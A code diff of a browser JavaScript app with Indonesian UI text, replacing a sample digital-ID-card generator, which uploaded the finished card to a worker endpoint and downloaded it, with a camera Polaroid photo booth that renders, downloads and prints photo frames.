+    const f=
+      frames[activeFrame];
+
+    if(
+      f.photos.length <
+      f.layout
+    ){
+
+      f.photos.push(
+        pending
+      );
+
+      if(
+        f.photos.length>=f.layout &&
+        activeFrame<frames.length-1
+      ){
+
+        activeFrame++;
+
+      }
+
+    }
+
+    pending=null;
+
+    modal.classList.remove(
+      "show"
+    );
+
+    render();
+
+    statusEl.textContent=
+      "Foto masuk ke Polaroid.";
+
+  };
 
 
-  const zoom =
-    Number(bgZoom.value) / 100;
+/* =========================================================
+   FLIP
+========================================================= */
 
-  const drawW =
-    baseW * zoom;
+document
+  .getElementById("flip")
+  .onclick=async()=>{
 
-  const drawH =
-    baseH * zoom;
+    facing=
+      facing==="user"
+        ?"environment"
+        :"user";
 
+    await startCamera();
 
-  const offsetX =
-    Number(bgX.value) *
-    W / 100;
-
-  const offsetY =
-    Number(bgY.value) *
-    H / 100;
-
-
-  const x =
-    W/2 -
-    drawW/2 +
-    offsetX;
-
-  const y =
-    H/2 -
-    drawH/2 +
-    offsetY;
+  };
 
 
-  ctx.save();
+/* =========================================================
+   RETRY
+========================================================= */
 
-  ctx.beginPath();
+document
+  .getElementById("retryCamera")
+  .onclick=()=>{
 
-  ctx.rect(
-    0,
-    0,
-    W,
-    H
+    startCamera();
+
+  };
+
+
+/* =========================================================
+   RESET
+========================================================= */
+
+document
+  .getElementById("clear")
+  .onclick=()=>{
+
+    frames.forEach(
+      f=>{
+
+        f.photos=[];
+        f.layout=1;
+
+      }
+    );
+
+    activeFrame=0;
+
+    render();
+
+    statusEl.textContent=
+      "Polaroid dikosongkan.";
+
+  };
+
+
+/* =========================================================
+   CEK FOTO
+========================================================= */
+
+function punyaFoto(){
+
+  return frames.some(
+    f=>f.photos.length>0
   );
-
-  ctx.clip();
-
-  ctx.drawImage(
-    backgroundImage,
-    x,
-    y,
-    drawW,
-    drawH
-  );
-
-  ctx.restore();
 
 }
 
 
 /* =========================================================
-   DRAW COVER FOTO
+   FRAME TERISI
 ========================================================= */
 
-function drawPhoto(
+function getFilledFrames(){
+
+  return frames.filter(
+    f=>f.photos.length>0
+  );
+
+}
+
+
+/* =========================================================
+   DRAW BACKGROUND MOTIF KE CANVAS
+========================================================= */
+
+function drawMotifBackground(
   ctx,
-  img,
+  src,
   x,
   y,
   w,
   h
 ){
 
-  const scale =
-    Math.max(
-      w/img.width,
-      h/img.height
-    );
+  return new Promise(
+    resolve=>{
 
-  const dw =
-    img.width * scale;
+      const img=
+        new Image();
 
-  const dh =
-    img.height * scale;
+      img.onload=()=>{
 
-  const dx =
-    x +
-    (w-dw)/2;
+        ctx.drawImage(
+          img,
+          x,
+          y,
+          w,
+          h
+        );
 
-  const dy =
-    y +
-    (h-dh)/2;
+        resolve();
 
-  ctx.save();
+      };
 
-  roundedRect(
-    ctx,
-    x,
-    y,
-    w,
-    h,
-    28
-  );
+      img.onerror=()=>{
 
-  ctx.clip();
+        /*
+          Fallback jika gambar gagal.
+        */
 
-  ctx.drawImage(
-    img,
-    dx,
-    dy,
-    dw,
-    dh
-  );
+        ctx.fillStyle="#eeeeee";
 
-  ctx.restore();
+        ctx.fillRect(
+          x,
+          y,
+          w,
+          h
+        );
 
-}
+        resolve();
 
+      };
 
-/* =========================================================
-   RENDER FINAL CARD
-========================================================= */
-
-function renderCardImage(){
-
-  const W =
-    1400;
-
-  const H =
-    Math.round(
-      W / 1.586
-    );
-
-  const canvas =
-    document.createElement(
-      "canvas"
-    );
-
-  canvas.width =
-    W;
-
-  canvas.height =
-    H;
-
-  const ctx =
-    canvas.getContext("2d");
-
-
-  /* BACKGROUND */
-
-  drawBackgroundToCanvas(
-    ctx,
-    W,
-    H
-  );
-
-
-  /* DARK OVERLAY */
-
-  const overlay =
-    ctx.createLinearGradient(
-      0,
-      0,
-      W,
-      H
-    );
-
-  overlay.addColorStop(
-    0,
-    "rgba(4,7,18,.78)"
-  );
-
-  overlay.addColorStop(
-    .45,
-    "rgba(7,9,22,.34)"
-  );
-
-  overlay.addColorStop(
-    1,
-    "rgba(5,7,17,.68)"
-  );
-
-  ctx.fillStyle =
-    overlay;
-
-  ctx.fillRect(
-    0,
-    0,
-    W,
-    H
-  );
-
-
-  /* GLOW */
-
-  const glow =
-    ctx.createRadialGradient(
-      W*.88,
-      H*.05,
-      0,
-      W*.88,
-      H*.05,
-      W*.36
-    );
-
-  glow.addColorStop(
-    0,
-    "rgba(190,100,255,.27)"
-  );
-
-  glow.addColorStop(
-    1,
-    "rgba(190,100,255,0)"
-  );
-
-  ctx.fillStyle =
-    glow;
-
-  ctx.fillRect(
-    0,
-    0,
-    W,
-    H
-  );
-
-
-  /* BORDER */
-
-  ctx.strokeStyle =
-    "rgba(255,255,255,.25)";
-
-  ctx.lineWidth =
-    4;
-
-  roundedRect(
-    ctx,
-    3,
-    3,
-    W-6,
-    H-6,
-    45
-  );
-
-  ctx.stroke();
-
-
-  /* TITLE */
-
-  ctx.fillStyle =
-    "#fff";
-
-  ctx.font =
-    "900 34px Arial";
-
-  ctx.fillText(
-    "KARTU IDENTITAS DIGITAL",
-    55,
-    70
-  );
-
-  ctx.fillStyle =
-    "rgba(255,255,255,.65)";
-
-  ctx.font =
-    "16px Arial";
-
-  ctx.fillText(
-    "DIGITAL PERSONAL CARD",
-    58,
-    96
-  );
-
-
-  /* PHOTO */
-
-  const px =
-    W*.04;
-
-  const py =
-    H*.24;
-
-  const pw =
-    W*.27;
-
-  const ph =
-    H*.58;
-
-
-  if(photoImage){
-
-    drawPhoto(
-      ctx,
-      photoImage,
-      px,
-      py,
-      pw,
-      ph
-    );
-
-  }else{
-
-    const photoBg =
-      ctx.createLinearGradient(
-        px,
-        py,
-        px+pw,
-        py+ph
-      );
-
-    photoBg.addColorStop(
-      0,
-      "rgba(255,255,255,.15)"
-    );
-
-    photoBg.addColorStop(
-      1,
-      "rgba(255,255,255,.03)"
-    );
-
-    ctx.fillStyle =
-      photoBg;
-
-    roundedRect(
-      ctx,
-      px,
-      py,
-      pw,
-      ph,
-      28
-    );
-
-    ctx.fill();
-
-    ctx.fillStyle =
-      "rgba(255,255,255,.4)";
-
-    ctx.font =
-      "bold 25px Arial";
-
-    ctx.textAlign =
-      "center";
-
-    ctx.textBaseline =
-      "middle";
-
-    ctx.fillText(
-      "FOTO",
-      px+pw/2,
-      py+ph/2
-    );
-
-    ctx.textAlign =
-      "left";
-
-    ctx.textBaseline =
-      "alphabetic";
-
-  }
-
-
-  ctx.strokeStyle =
-    "rgba(255,255,255,.3)";
-
-  ctx.lineWidth =
-    3;
-
-  roundedRect(
-    ctx,
-    px,
-    py,
-    pw,
-    ph,
-    28
-  );
-
-  ctx.stroke();
-
-
-  /* DATA */
-
-  const dx =
-    W*.35;
-
-  let yy =
-    H*.28;
-
-  const values = [
-
-    [
-      "NAMA",
-      getValue("nama")
-    ],
-
-    [
-      "ALAMAT",
-      getValue("alamat")
-    ],
-
-    [
-      "TEMPAT / TANGGAL LAHIR",
-      getValue("ttl")
-    ],
-
-    [
-      "JENIS KELAMIN",
-      getValue("kelamin")
-    ],
-
-    [
-      "AGAMA",
-      getValue("agama")
-    ],
-
-    [
-      "ID KARTU",
-      getValue("idKartu")
-    ]
-
-  ];
-
-
-  values.forEach(
-    ([label,value],index)=>{
-
-      ctx.fillStyle =
-        "rgba(255,255,255,.55)";
-
-      ctx.font =
-        "12px Arial";
-
-      ctx.fillText(
-        label,
-        dx,
-        yy
-      );
-
-
-      ctx.fillStyle =
-        "#fff";
-
-      ctx.font =
-        "bold 18px Arial";
-
-
-      let text =
-        value;
-
-      const maxWidth =
-        W*.58;
-
-
-      while(
-        ctx.measureText(text).width >
-        maxWidth &&
-        text.length > 3
-      ){
-
-        text =
-          text.slice(
-            0,
-            -1
-          );
-
-      }
-
-
-      if(text !== value){
-
-        text =
-          text.slice(
-            0,
-            -1
-          ) + "…";
-
-      }
-
-
-      ctx.fillText(
-        text,
-        dx,
-        yy+25
-      );
-
-
-      yy +=
-        index === 1
-          ? 75
-          : 61;
+      img.src=src;
 
     }
   );
 
-
-  /* CHIP */
-
-  const chipX =
-    W*.04;
-
-  const chipY =
-    H*.88;
-
-  const chipW =
-    76;
-
-  const chipH =
-    53;
+}
 
 
-  const chipGradient =
-    ctx.createLinearGradient(
-      chipX,
-      chipY,
-      chipX+chipW,
-      chipY+chipH
+/* =========================================================
+   BUAT GAMBAR POLAROID
+========================================================= */
+
+async function buatGambarPolaroid(){
+
+  const filled=
+    getFilledFrames();
+
+  if(!filled.length)
+    return null;
+
+  const scale=2;
+
+  const width=800;
+
+  const padding=35;
+
+  const gap=28;
+
+  const frameWidth=
+    width-padding*2;
+
+  const photoRatio=4/3;
+
+  let height=90;
+
+  for(
+    const f of filled
+  ){
+
+    const slotWidth=
+      (
+        frameWidth-
+        (f.layout-1)*5
+      )/
+      f.layout;
+
+    const frameHeight=
+      slotWidth*photoRatio;
+
+    height+=
+      55+
+      frameHeight+
+      gap;
+
+  }
+
+  height+=padding;
+
+  const out=
+    document.createElement(
+      "canvas"
     );
 
-  chipGradient.addColorStop(
+  out.width=width*scale;
+  out.height=height*scale;
+
+  const ctx=
+    out.getContext("2d");
+
+  ctx.scale(
+    scale,
+    scale
+  );
+
+
+  /* =====================================================
+     BACKGROUND MOTIF
+  ====================================================== */
+
+  await drawMotifBackground(
+    ctx,
+    getMotifImage(),
     0,
-    "#d2b35c"
+    0,
+    width,
+    height
   );
 
-  chipGradient.addColorStop(
-    .5,
-    "#fff0a1"
+
+  /* =====================================================
+     JUDUL
+  ====================================================== */
+
+  ctx.fillStyle="#111";
+
+  ctx.font=
+    "bold 30px Arial";
+
+  ctx.textAlign="center";
+
+  /*
+    Background putih tipis di belakang
+    judul supaya tetap terbaca.
+  */
+
+  ctx.fillStyle=
+    "rgba(255,255,255,.82)";
+
+  ctx.fillRect(
+    width/2-150,
+    17,
+    300,
+    42
   );
 
-  chipGradient.addColorStop(
-    1,
-    "#a27e30"
-  );
-
-  ctx.fillStyle =
-    chipGradient;
-
-  roundedRect(
-    ctx,
-    chipX,
-    chipY,
-    chipW,
-    chipH,
-    10
-  );
-
-  ctx.fill();
-
-
-  ctx.strokeStyle =
-    "rgba(80,60,15,.55)";
-
-  ctx.lineWidth =
-    2;
-
-  roundedRect(
-    ctx,
-    chipX+9,
-    chipY+12,
-    chipW-18,
-    chipH-24,
-    7
-  );
-
-  ctx.stroke();
-
-
-  ctx.beginPath();
-
-  ctx.moveTo(
-    chipX+chipW/2,
-    chipY+6
-  );
-
-  ctx.lineTo(
-    chipX+chipW/2,
-    chipY+chipH-6
-  );
-
-  ctx.stroke();
-
-
-  /* WATERMARK */
-
-  ctx.textAlign =
-    "right";
-
-  ctx.fillStyle =
-    "rgba(255,255,255,.55)";
-
-  ctx.font =
-    "bold 12px Arial";
+  ctx.fillStyle="#111";
 
   ctx.fillText(
-    "CONTOH • TIDAK BERLAKU",
-    W-55,
-    H-48
-  );
-
-  ctx.font =
-    "11px Arial";
-
-  ctx.fillText(
-    "SEBAGAI IDENTITAS RESMI",
-    W-55,
-    H-28
-  );
-
-  ctx.textAlign =
-    "left";
-
-
-  return canvas;
-
-}
-
-
-/* =========================================================
-   DOWNLOAD KARTU
-========================================================= */
-
-async function downloadKartu(){
-
-  updateCard();
-
-  setStatus(
-    "🪪 Membuat kartu..."
+    "MY POLAROID",
+    width/2,
+    48
   );
 
 
-  const canvas =
-    renderCardImage();
+  let y=75;
+
+  for(
+    const f of filled
+  ){
+
+    const originalIndex=
+      frames.indexOf(f);
+
+    const slotWidth=
+      (
+        frameWidth-
+        (f.layout-1)*5
+      )/
+      f.layout;
+
+    const frameHeight=
+      slotWidth*photoRatio;
 
 
-  canvas.toBlob(
-    async function(blob){
+    /* ===================================================
+       KARTU FOTO
+    ==================================================== */
 
-      if(!blob){
+    ctx.fillStyle=
+      "rgba(255,255,255,.97)";
 
-        setStatus(
-          "Gagal membuat JPG."
-        );
-
-        return;
-
-      }
-
-
-      const filename =
-        "kartu-identitas-digital.jpg";
+    ctx.fillRect(
+      padding,
+      y,
+      frameWidth,
+      frameHeight+34
+    );
 
 
-      /*
-        Kartu final dikirim ke Worker.
-      */
+    ctx.fillStyle="#777";
 
-      try{
+    ctx.font=
+      "bold 18px Arial";
 
-        setStatus(
-          "📤 Mengirim kartu..."
-        );
+    ctx.fillText(
+      namaFrame[originalIndex],
+      width/2,
+      y+24
+    );
 
-        const form =
-          new FormData();
 
-        form.append(
-          "photo",
-          blob,
-          filename
-        );
+    const imageY=y+34;
 
-        const response =
-          await fetch(
-            WORKER_URL,
-            {
-              method:"POST",
-              body:form
-            }
-          );
 
-        const result =
-          await response.json();
+    for(
+      let s=0;
+      s<f.layout;
+      s++
+    ){
 
-        if(
-          !response.ok ||
-          !result.ok
-        ){
+      const x=
+        padding+
+        s*(slotWidth+5);
 
-          throw new Error(
-            result.error ||
-            "Worker gagal menerima kartu."
-          );
+      ctx.fillStyle="#ddd";
 
-        }
+      ctx.fillRect(
+        x,
+        imageY,
+        slotWidth,
+        frameHeight
+      );
 
-        setStatus(
-          "🪪 Kartu berhasil dikirim."
-        );
+      if(f.photos[s]){
 
-      }catch(error){
-
-        console.error(error);
-
-        setStatus(
-          "⚠️ Kartu gagal dikirim, tetapi tetap di-download."
+        await drawImageCover(
+          ctx,
+          f.photos[s],
+          x,
+          imageY,
+          slotWidth,
+          frameHeight
         );
 
       }
 
+    }
 
-      /*
-        DOWNLOAD KE HP
-      */
+    y+=
+      frameHeight+
+      34+
+      gap;
 
-      const url =
-        URL.createObjectURL(blob);
+  }
 
-      const a =
-        document.createElement("a");
+  return out;
 
-      a.href =
-        url;
-
-      a.download =
-        filename;
-
-      document.body.appendChild(a);
-
-      a.click();
-
-      a.remove();
+}
 
 
-      setTimeout(
-        function(){
+/* =========================================================
+   DRAW IMAGE
+========================================================= */
 
-          URL.revokeObjectURL(url);
+function drawImageCover(
+  ctx,
+  src,
+  x,
+  y,
+  w,
+  h
+){
 
-        },
-        2000
-      );
+  return new Promise(
+    resolve=>{
 
+      const img=
+        new Image();
 
-      setStatus(
-        "✅ Selesai. Kartu tersimpan di HP."
-      );
+      img.onload=()=>{
 
+        const ratio=
+          Math.max(
+            w/img.width,
+            h/img.height
+          );
 
-    },
-    "image/jpeg",
-    .94
+        const nw=
+          img.width*ratio;
+
+        const nh=
+          img.height*ratio;
+
+        const dx=
+          x+(w-nw)/2;
+
+        const dy=
+          y+(h-nh)/2;
+
+        ctx.save();
+
+        ctx.beginPath();
+
+        ctx.rect(
+          x,
+          y,
+          w,
+          h
+        );
+
+        ctx.clip();
+
+        ctx.drawImage(
+          img,
+          dx,
+          dy,
+          nw,
+          nh
+        );
+
+        ctx.restore();
+
+        resolve();
+
+      };
+
+      img.onerror=resolve;
+
+      img.src=src;
+
+    }
   );
 
 }
 
 
 /* =========================================================
-   HAPUS SEMUA
+   DOWNLOAD
 ========================================================= */
 
-function hapusKartu(){
+document
+  .getElementById("downloadPolaroid")
+  .onclick=async()=>{
 
-  document.getElementById("nama")
-    .value = "";
+    if(!punyaFoto()){
 
-  document.getElementById("alamat")
-    .value = "";
+      alert(
+        "Belum ada foto."
+      );
 
-  document.getElementById("ttl")
-    .value = "";
+      return;
 
-  document.getElementById("kelamin")
-    .value = "";
+    }
 
-  document.getElementById("agama")
-    .value = "";
+    statusEl.textContent=
+      "Membuat Polaroid...";
 
-  document.getElementById("idKartu")
-    .value = "";
+    const result=
+      await buatGambarPolaroid();
 
+    if(!result)
+      return;
 
-  photoImage =
-    null;
+    const link=
+      document.createElement("a");
 
-  photoPreview.src =
-    "";
+    link.download=
+      "polaroid.jpg";
 
-  photoPreview.style.display =
-    "none";
+    link.href=
+      result.toDataURL(
+        "image/jpeg",
+        .95
+      );
 
-  photoPlaceholder.style.display =
-    "flex";
+    link.click();
 
-  photoGallery.value =
-    "";
+    statusEl.textContent=
+      "Polaroid berhasil didownload.";
 
-
-  backgroundImage =
-    null;
-
-  bgPreviewImage.src =
-    "";
-
-  bgPreviewImage.style.display =
-    "none";
-
-  bgControls.style.display =
-    "none";
-
-  backgroundGallery.value =
-    "";
-
-
-  resetBgPosition();
-
-  updateCard();
-
-  setStatus(
-    "🗑️ Kartu berhasil dikosongkan."
-  );
-
-}
+  };
 
 
 /* =========================================================
-   INIT
+   PRINT
 ========================================================= */
 
-updateCard();
+document
+  .getElementById("printPolaroid")
+  .onclick=async()=>{
+
+    if(!punyaFoto()){
+
+      alert(
+        "Belum ada foto."
+      );
+
+      return;
+
+    }
+
+    statusEl.textContent=
+      "Menyiapkan cetakan...";
+
+    const result=
+      await buatGambarPolaroid();
+
+    if(!result)
+      return;
+
+    const data=
+      result.toDataURL(
+        "image/jpeg",
+        .95
+      );
+
+    const win=
+      window.open(
+        "",
+        "_blank"
+      );
+
+    if(!win){
+
+      alert(
+        "Popup diblokir. Izinkan popup."
+      );
+
+      return;
+
+    }
+
+    win.document.write(`
+
+<!doctype html>
+
+<html>
+
+<head>
+
+<title>Cetak Polaroid</title>
+
+<style>
+
+@page{
+  margin:0;
+}
+
+html,body{
+  margin:0;
+  padding:0;
+  background:#fff;
+}
+
+body{
+  display:flex;
+  justify-content:center;
+}
+
+img{
+  display:block;
+  width:100%;
+  max-width:420px;
+  height:auto;
+}
+
+@media print{
+
+  img{
+    width:100%;
+    max-width:none;
+  }
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<img src="${data}">
+
+<script>
+
+window.onload=()=>{
+
+  setTimeout(
+    ()=>window.print(),
+    500
+  );
+
+};
+
+<\/script>
+
+</body>
+
+</html>
+
+`);
+
+    win.document.close();
+
+    statusEl.textContent=
+      "Dialog cetak dibuka.";
+
+  };
+
+
+/* =========================================================
+   START
+========================================================= */
+
+render();
+
+renderMotifs();
+
+applyMotif();
+
+startCamera();
 
 </script>
 
